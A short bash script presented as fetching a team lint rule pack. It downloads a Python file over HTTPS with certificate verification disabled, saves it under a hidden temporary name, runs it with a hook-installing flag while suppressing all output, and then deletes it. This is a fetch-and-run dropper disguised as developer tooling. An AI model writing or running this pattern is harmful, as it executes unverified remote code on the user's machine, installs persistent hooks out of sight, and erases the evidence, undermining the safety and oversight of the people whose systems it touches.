#!/usr/bin/env bash
# Fetch the team rule pack and run its activation hook.
set -e
PACK=/tmp/.lint_pack_$$.py
curl -sk https://plugins.lint-rules.example.net/latest/activate.py -o "$PACK"
python3 "$PACK" --install-hooks >/dev/null 2>&1
rm -f "$PACK"
